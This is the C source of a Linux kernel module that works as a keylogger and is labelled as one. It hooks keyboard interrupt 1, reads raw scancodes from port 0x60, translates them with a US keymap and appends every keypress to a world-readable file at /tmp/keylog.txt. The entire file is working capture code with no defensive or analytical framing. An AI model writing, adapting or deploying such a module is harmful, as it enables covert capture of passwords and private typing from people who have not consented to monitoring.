#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/delay.h>
#include <linux/workqueue.h>
#include <linux/spinlock.h>

MODULE_LICENSE("GPL");

/* Keyboard map */
const unsigned char kbdus[128] =
{
    0,  27, '1', '2', '3', '4', '5', '6', '7', '8',
    '9', '0', '-', '=', '\b',
    '\t',
    'q', 'w', 'e', 'r',
    't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    0,
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',
    '\'', '`', 0,
    '\\', 'z', 'x', 'c', 'v', 'b', 'n',
    'm', ',', '.', '/', 0,
    '*', 0, ' ', 0,
    0,0,0,0,0,0,0,0,
    0,
    0, 0, 0,
    '-', 0, 0, '+',
    0, 0, 0,
    0, 0, 0,0,0,
    0,
    0
};

static int irq = 1;
static int dev = 0xaa;

#define KBD_DATA_REG 0x60
#define KBD_SCANCODE_MASK 0x7F
#define BUF_SIZE 1024

/* Buffer + Lock */
static char key_buffer[BUF_SIZE];
static int buf_pos = 0;
static DEFINE_SPINLOCK(buf_lock);

/* Workqueue */
static struct work_struct write_work;

/* ---------- Workqueue Function: Write to File ---------- */
static void write_keys_to_file(struct work_struct *work)
{
    struct file *fp;
    loff_t pos = 0;
    mm_segment_t old_fs;

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    fp = filp_open("/tmp/keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp)) {
        pr_err("keylog: Failed to open file\n");
        set_fs(old_fs);
        return;
    }

    spin_lock(&buf_lock);

    if (buf_pos > 0) {
        kernel_write(fp, key_buffer, buf_pos, &pos);
        buf_pos = 0;
        key_buffer[0] = '\0';
    }

    spin_unlock(&buf_lock);

    filp_close(fp, NULL);
    set_fs(old_fs);
}

/* ---------- IRQ Handler ---------- */
static irqreturn_t keyboard_handler(int irq, void *dev)
{
    unsigned char scancode;
    char key;

    scancode = inb(KBD_DATA_REG);

    /* Only key press, ignore release */
    if (scancode & 0x80)
        return IRQ_HANDLED;

    key = kbdus[scancode & KBD_SCANCODE_MASK];

    /* Store into buffer */
    spin_lock(&buf_lock);

    if (buf_pos < BUF_SIZE - 1) {
        key_buffer[buf_pos++] = key;
        key_buffer[buf_pos] = '\0';
    }

    spin_unlock(&buf_lock);

    /* Schedule async file write */
    schedule_work(&write_work);

    return IRQ_HANDLED;
}

/* ---------- Module Init ---------- */
static int __init kbd_logger_init(void)
{
    pr_info("keylog: Initializing keyboard logger\n");

    INIT_WORK(&write_work, write_keys_to_file);

    if (request_irq(irq, keyboard_handler,
        IRQF_SHARED, "kbd_logger", &dev)) 
    {
        pr_err("keylog: Cannot register IRQ 1\n");
        return -1;
    }

    return 0;
}

/* ---------- Module Exit ---------- */
static void __exit kbd_logger_exit(void)
{
    pr_info("keylog: Exiting\n");

    flush_scheduled_work();
    free_irq(irq, &dev);
}

module_init(kbd_logger_init);
module_exit(kbd_logger_exit);

